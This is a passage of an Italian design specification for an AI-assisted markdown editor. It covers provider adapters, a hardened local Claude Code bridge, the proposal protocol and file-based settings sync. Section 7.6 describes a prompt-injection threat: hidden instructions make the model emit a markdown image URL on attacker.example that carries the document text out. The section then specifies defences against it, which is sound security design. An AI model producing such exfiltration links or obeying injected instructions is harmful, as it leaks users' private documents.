  | { type: 'usage'; inputTokens?: number; outputTokens?: number }
  | { type: 'done'; stop: 'end' | 'length' | 'refusal' | 'other' };

interface ChatProvider {
  stream(req: ChatRequest, signal: AbortSignal): AsyncIterable<ChatEvent>;
  listModels(signal: AbortSignal): Promise<ModelOption[] | null>;   // null = server non raggiungibile
}

interface ModelOption { value: string; label: string; contextTokens?: number; }
```

`createProvider(profile, secret, deps)` sceglie l'adattatore. `deps.fetch` è iniettato: i test usano un `fetch`
finto con risposte SSE o JSON registrate.

### 6.2 Adattatori

**`ollama`, `lmstudio`, `openai-compatible`** (`providers/openaiCompatible.ts`, un solo adattatore con tre
configurazioni):
- `POST …/v1/chat/completions` con `stream: true`, `stream_options: { include_usage: true }`. Normalizzazione
  dell'URL come tg-digest (toglie `/` finale e `/v1` finale prima di ricomporre).
- Elenco modelli: Ollama `/api/tags`, LM Studio `/api/v0/models` → `/v1/models`, generico `/v1/models` (§4.4).
- `fetch` e parser SSE puro (`ai/sse.ts`), non l'SDK `openai`: il protocollo è uno standard de facto con variazioni
  tra server e serve pieno controllo su errori ed eventi parziali. Il parser gestisce righe spezzate tra chunk,
  `data: [DONE]`, commenti `:` di keep-alive, errori JSON a metà stream.
- `Authorization: Bearer <chiave>` solo se c'è una chiave.
- Parametri: `temperature`, `top_p`, `max_tokens`; `reasoning_effort` solo se abilitato nel profilo.

**`claude-code`** (`providers/claudeCode.ts`): parla con il bridge (§6.5) sullo stesso formato
`/v1/chat/completions`, ma **senza streaming** (`stream: false`): una risposta JSON intera. L'adattatore la converte
in un unico evento `text` seguito da `done`. Il campo `model` porta `''` (default della CLI), un alias o un ID.
Nessun parametro di campionamento (la CLI non li espone).

**`anthropic`** (`providers/anthropic.ts`) — API Messages nativa:
- SDK ufficiale `@anthropic-ai/sdk`, caricato con `import()` dinamico solo quando si usa un profilo Anthropic, con
  `dangerouslyAllowBrowser: true` (invia l'header `anthropic-dangerous-direct-browser-access`, lo stesso che
  tg-digest mette a mano). `client.messages.stream(...)` con `AbortSignal`; eventi di testo → `text`, blocchi di
  ragionamento → `thinking`, `usage` e `stop_reason` alla fine. Errori mappati con le classi tipizzate dell'SDK.
- Modelli attuali: `thinking: { type: 'adaptive' }`, profondità con `output_config.effort`; i parametri di
  campionamento (`temperature`, `top_p`) sono rifiutati con 400 dai modelli recenti (Opus 5, Sonnet 5, Opus 4.7+):
  li nasconde il filtro delle capacità. `max_tokens` default 64000 in streaming.
- `stop_reason: 'refusal'` → errore `refused`; `max_tokens` → proposta `truncated`.

### 6.3 Capacità e parametri al volo

`capabilities(kind, model, info?)` (puro) dice quali controlli mostrare nel popover:
- `ollama`/`lmstudio`/`openai-compatible`: `temperature`, `topP`, `maxOutputTokens`; `effort` solo se abilitato
  nel profilo.
- `anthropic`: modelli recenti solo `maxOutputTokens` ed `effort`; modelli meno recenti anche `temperature`/`topP`
  (tabella per famiglia, aggiornabile da `/v1/models` quando letto).
- `claude-code`: solo il modello.
- Un parametro rifiutato dal server (400 che ne cita il nome) produce l'errore `paramRejected` con il nome e un
  pulsante "Rimuovi il parametro e riprova".

### 6.4 Locali, cloud: cosa serve lato utente

- **Ollama / LM Studio:** funzionano offline e con la PWA installata. CORS: Ollama con `OLLAMA_ORIGINS`
  (l'origine di HouseMD, o `*` come nel README di tg-digest), LM Studio con "Enable CORS". Chrome può chiedere il
  permesso di **accesso alla rete locale** quando una pagina pubblica contatta `localhost`: un rifiuto appare come
  errore di rete e il messaggio lo nomina tra le cause. Da `https://` verso `http://localhost` non c'è blocco per
  contenuto misto.
- **Anthropic:** chiave API, CORS abilitato dall'header di accesso diretto.
- **`openai-compatible`:** llama.cpp, OpenRouter, OpenAI, Gemini, altri gateway. Il supporto CORS dei servizi cloud
  si verifica nella fase 0; uno senza CORS si usa solo dietro un proxy scritto nell'URL del profilo.
- **Privacy:** il gruppo del selettore dice sempre se il testo resta sul computer (Locali) o va a un servizio
  esterno (Cloud, con il nome dell'host). Il bridge Claude Code è locale ma inoltra il testo ad Anthropic tramite la
  CLI: il selettore lo dice ("locale → Anthropic"). Nessun invio automatico: il documento parte solo con
  un'azione esplicita.

### 6.5 Bridge Claude Code (D1)

`bridge/claude-bridge.mjs`, copiato da tg-digest e irrobustito. Server HTTP Node senza dipendenze che espone la CLI
`claude` come `POST /v1/chat/completions` compatibile OpenAI, così HouseMD usa l'abbonamento Claude Code senza chiave
API. Avvio: `npm run bridge` (o `node bridge/claude-bridge.mjs`).

**Porta 11436, non 11435.** La 11435 è quella del bridge di tg-digest, che accetta ogni origine e lascia gli
strumenti alla CLI: HouseMD non deve mai finirci per sbaglio. Default del profilo `claude-code`:
`http://localhost:11436` (`PORT` per cambiarla). Se all'avvio la porta è occupata, il bridge interroga `/health` su
quella porta: se risponde un bridge HouseMD compatibile (stessa `protocol`, sotto) lo riusa ed esce; altrimenti esce
con errore ("porta 11436 occupata da un altro programma") invece di far credere che il bridge sia attivo.

Comportamento ripreso da tg-digest:
- trova il binario `claude` da `CLAUDE_BIN`, poi `PATH`, poi le posizioni note (`~/.local/bin`, `~/.claude/local`,
  Homebrew);
- esegue la CLI in modalità `-p` con `--output-format text`, messaggi `system` → `--append-system-prompt`, gli altri
  su stdin; `--model` solo se indicato;
- timeout 5 minuti; errori come JSON `{ error }` con status 500 (binario non trovato, uscita non zero, timeout).

Differenze rispetto a tg-digest, **necessarie perché HouseMD è pubblicato su un'origine pubblica**:
- **Origini ammesse, non `*`.** Con `Access-Control-Allow-Origin: *` qualsiasi sito aperto nel browser potrebbe
  usare l'abbonamento dell'utente. Il bridge accetta solo le origini in `ALLOWED_ORIGINS` (default: l'origine
  pubblicata di HouseMD e `http://localhost:5173`), controlla l'header `Origin` su ogni richiesta (403 altrimenti,
  non si affida solo al CORS) e risponde al preflight solo per quelle.
- **Solo `127.0.0.1`**, mai su tutte le interfacce.
- **Invocazione fissa della CLI**, verificata su `claude --help`:
  `claude -p --output-format text --no-session-persistence --tools "" --strict-mcp-config [--model …]
  [--append-system-prompt …]`, con una cartella temporanea vuota (creata per richiesta, cancellata dopo) come
  directory di lavoro.
  - `--tools ""` disabilita tutti gli strumenti integrati e `--strict-mcp-config` ignora i server MCP configurati:
    un documento con istruzioni nascoste non può far leggere, scrivere o eseguire nulla alla CLI.
  - `--no-session-persistence` impedisce alla CLI di salvare la sessione su disco: coerente con D2, né chat né
    documenti sopravvivono alla sessione HouseMD dentro `~/.claude`. La cartella temporanea come directory di lavoro
    da sola non basterebbe.
  - Non si usa `--bare`: salterebbe la lettura del portachiavi, da cui dipende l'autenticazione dell'abbonamento.
  - Il test col finto `claude` verifica l'elenco esatto degli argomenti.
- **Identità e capacità dichiarate:** `GET /health` → `{ app: 'housemd-bridge', protocol: 1, version,
  protections: { originCheck: true, noTools: true, noSessionPersistence: true }, claude: '<percorso>' }`.
  L'adattatore `claudeCode` interroga `/health` prima della prima richiesta di ogni sessione HouseMD (e su "Prova
  connessione", e di nuovo dopo un errore di rete) e **non invia nessun documento** se la risposta manca, non è
  `housemd-bridge`, ha un `protocol` diverso o una protezione a `false`: errore `bridgeIncompatible` ("questo non è
  il bridge di HouseMD o è una versione non compatibile"). Un bridge tg-digest puntato per errore risponde 404 a
  `/health` e viene rifiutato. (Un programma locale che finge la risposta è fuori dal modello di minaccia: chi
  esegue codice sul computer ha già accesso a tutto.)
- **Storico completo:** tg-digest concatena i messaggi utente; qui la conversazione multi-turno si serializza su stdin
  con ruoli espliciti (`<user>`, `<assistant>`), perché la chat ha più turni.
- **Limite di dimensione del corpo** (es. 5 MB) e **una richiesta alla volta** (le altre in coda), così un doppio
  clic non avvia due CLI.
- **Interruzione:** se il client chiude la connessione (Stop in HouseMD), il bridge termina il processo `claude`.

Test del bridge con `node:test`: finto binario `claude` (script in una cartella temporanea via `CLAUDE_BIN`) che
registra argomenti e directory di lavoro; argomenti esatti; origini ammesse e rifiutate; preflight; corpo troppo
grande; timeout; interruzione del client; coda; `/health`; porta occupata da un altro programma (uscita con errore)
e da un bridge compatibile (riuso). Lato app: `claudeCode` rifiuta un `/health` assente, con `app` diversa, con
`protocol` diverso o con una protezione a `false`.

## 7. Protocollo della proposta

### 7.1 Due modalità di richiesta

- **Trasformazione (preset):** il modello restituisce **solo il testo trasformato**, niente commenti, niente tag.
  È il formato più robusto per i modelli locali piccoli e rende possibile l'elaborazione a parti. Il messaggio
  dell'assistente in chat è un riepilogo generato da HouseMD ("Sbobinato in 3 parti, 4.120 → 3.870 parole") più
  gli avvisi dei controlli.
- **Richiesta libera (chat):** il sistema chiede di rispondere con un eventuale breve commento e, se propone
  modifiche, il documento completo tra `<housemd-proposal>` e `</housemd-proposal>`. Senza tag la risposta è solo
  chat (domanda, spiegazione) e la proposta corrente non cambia. Se il file ha già una proposta, la richiesta libera
  lavora su quella ("rendi più formale il secondo paragrafo").

### 7.2 Costruzione dei messaggi (`ai/prompt.ts`, puro)

- `system`: regole della modalità + istruzioni del preset con variabili sostituite + regole fisse di HouseMD
  (conserva il markdown, i wikilink `[[…]]`, i link e i percorsi delle immagini).
- Documento: il file correlato alla richiesta (quello aperto all'invio), delimitato
  (`<document path="…">…</document>`); se ha una proposta corrente, anche quella
  (`<current-proposal>…</current-proposal>`).
- Storico della chat: i messaggi precedenti entrano **solo con il commento**, non con documenti o proposte (sarebbero
  N copie del testo). Quelli riferiti a un altro file portano l'indicazione del file
  (`[riferito a lezione-3.md]`), così il modello non li confonde con il documento corrente.
- Stima dei token (caratteri/4) prima dell'invio: oltre la finestra di contesto nota → per i preset si passa alle
  parti, per le richieste libere errore `tooLong` con il suggerimento di usare l'ambito "Selezione".
- Il contenuto del documento è **dato, non istruzioni**: sta dentro i delimitatori e le regole di sistema lo dicono.
  Senza strumenti con effetti (e con il bridge che li disabilita), e con il rendering dell'AI che non carica risorse
  remote (§7.6), il rischio di prompt injection si limita a una proposta sbagliata, che l'utente vede nel diff prima
  di accettare.

### 7.3 Parser in streaming (`ai/proposalStream.ts`, puro)

Macchina a stati che riceve i pezzi di testo e produce `{ comment, proposal, inProposal }` incrementali:
- tag spezzati a metà tra due pezzi (bufferizza il possibile prefisso di un tag);
- tag mai chiuso a fine stream → proposta `truncated` (con `stop: length`) o `complete` (se il modello ha solo
  dimenticato di chiudere);
- testo dopo il tag di chiusura → accodato al commento;
- in modalità trasformazione tutto il testo è proposta; si rimuove solo un eventuale recinto ```` ```markdown ````
  che avvolge l'intera risposta (errore tipico dei modelli piccoli).

Con `claude-code` il testo arriva in un unico pezzo: stesso parser, nessun caso speciale.

### 7.4 Frontmatter e parti (`ai/chunking.ts`, puro)

- `frontmatter: 'keep'`: il blocco YAML iniziale (riconosciuto da `preview/frontmatter.ts`) non si invia e viene
  rimesso identico davanti alla proposta.
- `splitForModel(text, maxChars)`: divide ai confini dei blocchi di primo livello, preferendo nell'ordine titoli,
  righe vuote, fine frase; mai dentro un blocco di codice recintato o una tabella. Una parte più lunga di `maxChars`
  che non si può dividere resta intera (avviso se supera la finestra di contesto).
- `maxChars` default: `chunkChars` del profilo; altrimenti derivato da `maxOutputTokens` e `contextTokens`
  (l'uscita di una parte deve stare nei token massimi in uscita: circa 3 caratteri per token con margine);
  ripiego 8.000 caratteri; per `claude-code` 40.000 (nessun limite di uscita configurabile, conta il timeout del
  bridge).
- Le parti si elaborano in sequenza. Ogni richiesta porta le istruzioni, "parte i di n" e la coda della parte
  precedente già elaborata (circa 500 caratteri) come contesto di sola lettura, per continuità di stile e
  terminologia.
- Durante l'elaborazione, la proposta è: parti elaborate + parti ancora originali, così il diff mostra
  l'avanzamento. L'accettazione resta disabilitata finché la richiesta è in corso (§4.5). Interrompendo, la proposta
  resta `partial` con lo stesso contenuto e diventa accettabile; un pulsante "Continua" riprende dalla prima parte
  mancante (e rende di nuovo la proposta `streaming`).
- Il ricongiungimento conserva i separatori originali tra le parti.

### 7.5 Controlli della proposta (`ai/checks.ts`, puro)

Avvisi (mai blocchi) mostrati in chat e come contatore nella barra proposta, cliccabile per saltare al punto:
- blocchi di codice recintati modificati (nel preset di traduzione si controlla solo il numero);
- wikilink: destinazioni `[[target]]` sparite o cambiate;
- URL dei link e percorsi delle immagini spariti o cambiati;
- frontmatter modificato (nelle richieste libere, dove viene inviato);
- rapporto di lunghezza anomalo: sbobina sotto il 60 % dell'originale ("forse ha riassunto invece di sbobinare"),
  traduzione fuori da 0,6–1,6, consecutio con più del 15 % delle righe cambiate ("ha toccato più dei verbi?");
- proposta troncata (limite di token raggiunto).

### 7.6 Rendering sicuro delle risposte e delle proposte (`ai/safeRender.ts`, puro)

Il testo prodotto dal modello è **non fidato**: un documento con istruzioni nascoste può far scrivere al modello
`![](https://attacker.example/c?d=<testo del documento>)`, e la sola visualizzazione trasmetterebbe il contenuto,
prima di qualsiasi accettazione e anche con un modello locale. La pipeline dell'anteprima non basta: in v1.1
`preview/sanitize.ts` lascia passare le immagini remote e `Preview` le carica. Regole:

- **Chat:** markdown-it con `html: false` (l'HTML grezzo nelle risposte si vede come testo) e regola `image`
  sostituita: nessun `<img>`; al suo posto un segnaposto testuale "immagine: <alt> (<host>)". Link resi con
  `rel="noopener noreferrer"`, aperti solo al clic. Poi `sanitize.ts` come sempre (difesa in profondità).
- **Proposta in vista Anteprima:** si riusa `Preview` con una nuova opzione `untrusted: { allowedUrls }` che
  cambia il rendering **a livello di token markdown-it, prima che esista qualsiasi HTML**: nessun parsing HTML
  (`DOMParser`, `innerHTML`, documenti di appoggio) sul testo del modello, perché non si può garantire che un
  documento analizzato non scarichi immagini o iframe.
  - `html: false`: l'HTML grezzo della proposta si vede come testo (per vederne l'effetto c'è la vista Sorgente, o
    si accetta e si guarda l'anteprima normale del documento);
  - regola `image` sostituita: `<img>` solo se `src` è in `allowedUrls`, altrimenti un pulsante segnaposto "carica
    immagine da <host>" che, al clic, inserisce l'immagine (caricamento esplicito, una volta);
  - `allowedUrls` = gli `src` dei token `image` del documento originale (stesso markdown-it, puro) più le immagini
    locali del workspace risolte da `readBlob`. Una proposta che conserva le immagini del documento le mostra, una
    che ne aggiunge di nuove no;
  - **stessa allowlist per il frontmatter:** in v1.1 `Preview` passa l'immagine del frontmatter (`image:` nel YAML)
    da `resolveImage` a `FrontmatterCard`, che crea un `<img>` fuori da markdown-it. In modalità `untrusted`
    `resolveImage` restituisce l'URL solo se è in `allowedUrls` (che include anche l'immagine del frontmatter
    dell'originale) o è locale; altrimenti `FrontmatterCard` mostra lo stesso segnaposto "carica immagine da
    <host>". Ogni altro punto di `Preview` che produce URL di risorse passa dallo stesso controllo;
  - poi `sanitize.ts` come sempre (difesa in profondità).
- **Proposta in vista Diff e Sorgente:** CodeMirror mostra testo, nessun rischio.
- Test puri sull'output HTML (stringa) dei renderer: immagine remota nuova → segnaposto, immagine dell'originale
  conservata, locale del workspace ammessa, `<img>`/`<picture>`/`<video poster>`/`<iframe>` scritti come HTML
  grezzo resi come testo, in chat e in proposta; `resolveImage` in modalità `untrusted` (immagine del frontmatter
  nuova → segnaposto, quella dell'originale → ammessa). Verifica in Chromium nel collaudo (fase 9, e alla fine della fase
  6): pannello Rete dei DevTools aperto, risposta e proposta con immagini remote, HTML grezzo, `srcset` e
  `image:` remota nel frontmatter di una proposta libera → nessuna
  richiesta verso host non ammessi finché non si clicca il segnaposto.

## 8. Sync opzionale di preset e profili (D3, pattern pivella-sync)

Il database resta la fonte di verità locale. La sync è un'opzione nelle Impostazioni, sezione AI →
**Sincronizzazione**: l'utente sceglie una cartella e HouseMD tiene lì un file `housemd-sync.json`. Stessi principi
di Pivella, ridotti a ciò che serve a pochi record di impostazioni.

**Garanzie: best effort in ogni caso.** Con queste API non esiste esclusione reciproca atomica, nemmeno sullo stesso
file system: il lock advisory (§8.4) riduce le collisioni ma due scrittori possono crederlo entrambi proprio (tutti e
due leggono "lock assente", scrivono, rileggono il proprio token in momenti sfalsati). Quindi un file può essere
sovrascritto da un risultato che non contiene l'ultima scrittura di un altro browser. Cosa si garantisce:
- **nessuna perdita definitiva finché i database locali restano intatti:** ogni versione scritta nel file proviene
  dal database di un browser, che la conserva; ai suoi giri successivi quel browser la rifonde e la riscrive (fusione
  idempotente, ordine totale delle versioni). Un browser che perde il proprio database (profilo cancellato) può
  perdere le modifiche che solo lui aveva e che il file non ha conservato;
- **convergenza eventuale, non a tempo:** anche i giri di recupero possono collidere di nuovo. Il file converge
  quando le scritture concorrenti cessano (nessuna modifica nuova per un po'), le repliche del servizio di sync si
  sono propagate e ogni browser coinvolto completa almeno un giro **senza collisione** con il database intatto;
- **il file non è mai troncato né invalido** (scrittura atomica verificata);
- **ogni scrittura parte da un backup del file che ha letto**, ma con due scrittori sovrapposti una versione
  pubblicata e subito sovrascritta può non comparire in nessun backup (A e B salvano entrambi il backup di S, poi
  pubblicano A e poi B: la versione A del file non è in nessun backup). I suoi record restano nel database di A
  (punto sopra); i backup servono al ripristino di uno stato passato, non come registro completo;
- sulla stessa macchina il lock rende le collisioni rare; tra computer diversi (Syncthing, Dropbox, Drive) non vale
  e le copie di conflitto create dal servizio si segnalano. In interfaccia le cartelle replicate sono "supportate con
  avviso", come le cartelle cloud in Pivella.

### 8.1 Formato del file

```json
{
  "app": "housemd",
  "schemaVersion": 1,
  "updatedAt": 1790000000000,
  "writer": { "id": "w_…", "kind": "app" },
  "restore": null,
  "stores": {
    "presets": [ { "id": "builtin:sbobina", "updatedAt": 0, "updatedBy": "seed", "name": "", "…": "…" } ],
    "profiles": [ { "id": "…", "updatedAt": 1790000000000, "updatedBy": "w_…", "kind": "ollama", "…": "…" } ]
  },
  "tombstones": [ { "store": "presets", "id": "…", "deletedAt": 1790000000001 } ]
}
```

- `secretId` non si scrive mai nel file (lo toglie la serializzazione, un test lo verifica); al rientro un profilo
  mantiene il `secretId` locale se esiste, e la chiave resta comunque legata al suo endpoint (§5.3).
- `restore`: epoca dell'ultimo ripristino da backup, `{ restoredAt, restoredFrom, restoreId }` o `null` (§8.5).
- Validazione stretta in lettura (`ai/sync/schema.ts`): store obbligatori, `id` stringa, niente duplicati, record
  validati con le stesse funzioni degli store. Un file non valido non si tocca e non si fonde: errore
  `syncInvalid` con il dettaglio.
- JSON canonico (chiavi ordinate, indentazione fissa), così "riscrivi solo se diverso" confronta testi stabili.

### 8.2 Fusione (`ai/sync/merge.ts`, puro)

- `writerId` generato una volta per browser e salvato in `aiSyncMeta`.
- A **record intero**, mai per campo. Ordine totale delle versioni di uno stesso `id`, confrontando nell'ordine:
  1. `updatedAt` (numero, maggiore vince);
  2. `updatedBy` (lessicografico, maggiore vince);
  3. **JSON canonico del record** (lessicografico, maggiore vince): spareggio finale per due versioni diverse con
     stesso timbro e stesso autore (due scritture nello stesso millisecondo, semi di versioni dell'app diverse).
  Versioni identiche sono la stessa versione. Confronti di tempo sempre su numeri, mai su stringhe.
- I timbri locali sono monotoni (`nextStamp`, §5.1): una modifica fatta dopo aver importato una versione "dal
  futuro" la supera comunque.
- Tombstone: vince sul record se `deletedAt > updatedAt`; tra due tombstone dello stesso record vince il più recente
  (a parità, stesso spareggio). Tombstone potati dopo 90 giorni, **solo in scrittura** e mai dentro la fusione (in
  Pivella la potatura dentro il merge faceva risorgere record).
- Proprietà verificate dai test (anche a proprietà, con generatore di versioni che include timbri uguali, autori
  uguali e payload diversi, semi): commutativa, idempotente, associativa su tre lati.
- Esito: `{ merged, localChanges, remoteChanged }`, dove `localChanges` sono le differenze da applicare al database.

### 8.3 Ciclo

- **Quando:** all'avvio, al ritorno del focus sulla finestra, e dopo una modifica locale a preset o profili (debounce
  500 ms). Pulsante "Sincronizza ora". Niente polling. Un giro alla volta per scheda.
- **Giro:**
  1. leggi il file e il suo `lastModified`, valida;
  2. confronto dell'epoca del file con `localEpoch` (§8.5): rimpiazzo, fusione normale o ripubblicazione;
  3. fondi con lo snapshot locale (record + tombstone);
  4. applica le differenze al database in **una transazione**, saltando i record cambiati localmente durante il giro
     (si confrontano con lo snapshot usato per la fusione: lezione F15 di Pivella);
  5. **riscrivi solo se il risultato è diverso dal file**, sotto lock (§8.4): dentro il lock si rilegge il file; se
     `lastModified` o contenuto sono cambiati rispetto al punto 1, si rilascia e si ricomincia dal punto 1 (massimo 3
     tentativi, poi esito `stale` e si riprova al giro successivo).
- File assente: lo si crea (sotto lock) con lo snapshot locale.
- **Permesso:** l'handle della cartella è salvato in `aiSyncMeta`. Dopo un riavvio del browser il permesso va
  richiesto con un gesto dell'utente: banner nella sezione e icona di avviso sul selettore "Riattiva
  sincronizzazione". Senza permesso l'app funziona normalmente, solo senza sync.
- Esiti mostrati nella sezione: ultima sync, `created`, `restored`, `unchanged`, `written`, `stale`, errore con il
  motivo.

### 8.4 Scrittura sicura

- **Lock advisory** `housemd-sync.lock` come in Pivella (§13.3): contenuto `{ writerId, token, acquiredAt }` con
  `token` casuale per tentativo; acquisizione = se il file manca o `acquiredAt` è più vecchio di 10 s lo si scrive,
  si attende 50 ms, si rilegge, e il lock è preso solo se contiene il proprio `token`; timeout 3 s, poi esito
  `stale`. Rilascio cancellando il file solo se contiene ancora il proprio `token`. Non è esclusione atomica (queste
  API non la permettono): per questo restano il ricontrollo dentro il lock, il backup obbligatorio e la
  rifusione al giro successivo.
- **Backup prima di ogni scrittura** in `housemd-backups/housemd-sync.<timestamp>.<writerId>.json` (timestamp con i
  due punti sostituiti da trattini, suffisso `-N` se esiste già: un backup non si sovrascrive mai); se il backup
  fallisce, il file di sync non si tocca. Si conservano gli ultimi 20 backup, più i `pre-restore` per sempre.
- **Scrittura atomica con temporaneo univoco:** byte in `housemd-sync.<writerId>.<token>.part` (mai un nome
  condiviso tra scrittori), rilettura e confronto di lunghezza e SHA-256, poi `moveFile` (se `FsOps` lo offre); se
  rifiuta con `NotSupportedError` o `NotAllowedError` (Chrome sui file locali lo fa in modo intermittente, visto in
  Pivella) si scrive direttamente sul nome definitivo, si rilegge, si verifica, e solo dopo si cancella il `.part`.
  I `.part` più vecchi di un'ora lasciati da scrittori interrotti si cancellano al giro successivo.
- Le copie di conflitto create dai servizi di sync (es. `housemd-sync (conflicted copy).json`) si ignorano; la
  sezione le segnala se ne trova.
- Test con due cicli intrecciati passo per passo su `memoryOps` (scheduler controllato): (a) caso normale, il lock
  serializza e il secondo rilegge e rifonde; (b) **doppio possesso**: A e B leggono entrambi "lock assente", A scrive
  e verifica il lock, B ritardato scrive e verifica il proprio mentre A lavora, entrambi scrivono il file: il
  risultato di uno si perde nel file, e dopo un giro di ciascuno con database intatto il file contiene di nuovo
  entrambe le modifiche; (c) lo stesso con il database di B azzerato prima del suo giro: documenta il limite (la
  modifica solo di B è persa) invece di nasconderlo; (d) nessun `.part` condiviso in nessun caso.

### 8.5 Ripristino da backup

Il ripristino è un **rimpiazzo totale** di preset e profili, non una fusione: deve vincere anche sui record più
recenti degli altri browser. Protocollo ripreso da Pivella (`restoredAt` / `lastRestoreAck`), esteso con un'identità
completa del ripristino ("epoca").

**Epoca.** `RestoreEpoch = { restoredAt: number; restoredFrom: string; restoreId: string } | null` (`restoreId`
casuale, generato a ogni ripristino; `null` = nessun ripristino, precede ogni epoca). Ordine totale: `restoredAt`,
poi `restoredFrom`, poi `restoreId`. Il file porta l'epoca nella busta (campo `restore`, §8.1); ogni browser tiene in `aiSyncMeta` la **propria epoca corrente**
`localEpoch` (l'intera identità, non solo il numero) e **scrive sempre la propria** `localEpoch` nella busta, mai
quella letta dal file.

**Ciclo** (punto 2 di §8.3, confronto `remote` = epoca del file contro `localEpoch`):
- `remote > localEpoch` → **adozione dell'epoca**: prima una copia del proprio stato locale nella cartella di backup
  (`housemd-backups/…<writerId>.local-before-restore.json`), così le modifiche fatte qui dopo il backup ripristinato
  non spariscono senza traccia; poi in **una sola transazione**: record = quelli del file, tombstone = **quelli del
  file** (le cancellazioni fatte da altri browser dopo il ripristino, nella stessa epoca, vanno conservate, altrimenti
  una replica obsoleta della stessa epoca potrebbe far risorgere quei record), `localEpoch = remote`. Fine del giro.
  I tombstone si svuotano solo alla **creazione** di un ripristino (sotto), mai nell'adozione.
- `remote == localEpoch` → fusione normale.
- `remote < localEpoch` → il file viene da un'epoca superata (per esempio una replica obsoleta che ha sovrascritto il
  file dopo il ripristino): i suoi record **non si fondono**; si ripubblica lo stato locale con `localEpoch` (sotto
  lock, con backup come ogni scrittura). Le modifiche fatte dagli altri browser nell'epoca corrente sono nei loro
  database e le ripubblicano loro al giro successivo; quelle dell'epoca vecchia le scartano quando vedono l'epoca
  nuova.

**Ripristino sul browser A** ("Ripristina questo backup", con anteprima dei conteggi e conferma):
1. sotto lock, backup `pre-restore` del file corrente, poi scrittura del contenuto del backup con una nuova epoca
   (`restoredAt = nextStamp`, `restoredFrom = <nome del backup>`, `restoreId` nuovo), tombstone svuotati,
   `writer.kind = 'restore'`;
2. **prima il file, poi il database:** dopo la scrittura verificata, A rimpiazza i propri store e salva
   `localEpoch` nella stessa transazione. Se A si chiude a metà, al giro successivo vede `remote > localEpoch` e
   completa il rimpiazzo come un qualsiasi altro browser.

Copiare a mano un backup sopra il file **non** è un ripristino: se il backup ha un'epoca vecchia viene trattato come
replica obsoleta e sovrascritto, altrimenti la fusione fa vincere i record più recenti. Lo dice il testo della
sezione, come in Pivella.

Test: ripristino su A con B che ha record più recenti e record assenti dal backup (dopo il giro di B restano solo i
record del backup, e la copia locale di B esiste); crash di A tra file e database; **cancellazione dopo il
ripristino**: A ripristina, C adotta l'epoca e cancella Y, B adotta l'epoca dopo e importa il tombstone di Y, poi una
replica obsoleta della stessa epoca con Y ricompare → Y non risorge né su B né nel file; **replica obsoleta dopo il
ripristino** (il file torna all'epoca precedente con il record X eliminato dal ripristino: A non reintroduce X e
ripubblica l'epoca corrente; B, ancora nell'epoca vecchia, dopo aver letto l'epoca nuova scarta X); **due
ripristini concorrenti con lo stesso `restoredAt`** (vince lo stesso su tutti i browser grazie a `restoredFrom` e
`restoreId`); due ripristini in successione.

### 8.6 Moduli

`ai/sync/stamp.ts` (timbri monotoni), `ai/sync/schema.ts` (validazione, canonico), `ai/sync/merge.ts`,
`ai/sync/lock.ts`, `ai/sync/syncFile.ts` (lettura, backup, scrittura atomica su `FsOps`), `ai/sync/restore.ts`,
`ai/sync/syncCycle.ts` (il giro, con store, `FsOps`, orologio e attesa iniettati), `ai/aiSync.ts` (stato
osservabile, trigger, permesso). I test usano `memoryOps` e `fake-indexeddb`: nessuna cartella reale.

## 9. Architettura del codice

```
bridge/
  claude-bridge.mjs     bridge Claude Code (§6.5) + test node:test con finto claude
src/ai/
  types.ts              tipi condivisi (§5, §6.1)
  profiles.ts           validazione, default per provider, effectiveParams, isLocalProfile, normalizzazione URL (puro)
  models.ts             elenchi statici (Anthropic, alias Claude Code, ripiego Ollama), knownModel, cambio provider (puro)
  capabilities.ts       parametri ammessi per provider/modello                                    (puro)
  presets.ts            predefiniti, seme, ripristino originale, variabili, validazione            (puro)
  prompt.ts             system/messaggi con correlazione al file, stima token                     (puro)
  proposalStream.ts     parser in streaming dei tag e dei recinti                                 (puro)
  chunking.ts           frontmatter, suddivisione, ricongiungimento                               (puro)
  checks.ts             controlli della proposta                                                  (puro)
  safeRender.ts         renderer markdown-it per chat e proposte non fidate (§7.6)                (puro)
  scope.ts              ambito Selezione: mapScope, applyScope (§5.5)                             (puro)
  align.ts              ancore per lo scroll della vista affiancata                               (puro)
  sse.ts                parser Server-Sent Events                                                 (puro)
  errors.ts             AiErrorCode + mappatura da status HTTP / eccezioni, pulizia dei segreti   (puro)
  runner.ts             esecuzione di una richiesta: intera o a parti, progressi, abort → eventi  (puro, provider iniettato)
  aiController.ts       stato osservabile: profili, preset, chat, proposte, override, run/stop/accept
  stores.ts             interfacce ProfileStore/SecretStore/PresetStore/SyncMetaStore + impl. memoria
  idbStores.ts          implementazioni IndexedDB (timbri e tombstone)
  sync/                 stamp, schema, merge, lock, syncFile, restore, syncCycle (§8.6)
  aiSync.ts             stato osservabile della sync
  providers/
    index.ts            createProvider
    openaiCompatible.ts ollama / lmstudio / openai-compatible
    claudeCode.ts       bridge, senza streaming
    anthropic.ts        @anthropic-ai/sdk (import dinamico)
src/editor/
  docExtensions.ts      estensioni del documento estratte da Editor.tsx
  useDocBinding.ts      resetKey + comando restore condivisi, notifica delle modifiche (rimappatura della selezione)
  docSession.ts         testo, selezione e cronologia del documento tra una vista e l'altra (puro)
src/ui/ai/
  AiSidebar.tsx         testata (switch), selettore, barra preset, chat, campo di invio
  ModelSelector.tsx     select dei profili + popover modello/parametri
  ModelSelect.tsx       select del modello stile tg-digest (elenco live, "Altro…", personalizzato)
  ChatLog.tsx           messaggi (markdown sanitizzato), etichette di file
  ReviewView.tsx        barra proposta + vista Diff o Affiancata
  DiffPane.tsx          host di MergeView
  SideBySidePane.tsx    editor + proposta (sorgente o Preview) con scroll collegato
  settings/
    AiProfilesSection.tsx   sezione Profili delle Impostazioni
    AiPresetsSection.tsx    sezione Preset
    AiSyncSection.tsx       sezione Sincronizzazione
```

- **`AiController`** dipende da un'interfaccia minima del workspace, non dalla classe:
  `{ getDoc(): { path; textLf; conflict; updating } | null; subscribe; snapshotBeforeAi(); openFile(path) }`. Così
  i test non montano un `Workspace` intero. Il testo accettato non passa dal controller: passa dall'editor sinistro
  (`workspace.edit`), come ogni battitura.
- **Una sola fonte di verità del documento, con cronologia di annullamento che sopravvive ai cambi di vista.** In
  v1.1 `Editor` ricrea lo stato a ogni montaggio (`setState(createState(...))`) e `MergeView` costruisce i propri
  stati da un `EditorStateConfig`: senza un accorgimento, accettare una proposta, tornare alla sidebar File e premere
  `Ctrl+Z` non annullerebbe nulla. Soluzione:
  - **`DocSession`** (`editor/docSession.ts`, puro), uno per documento aperto, tenuto da `WorkspaceView` fuori dai
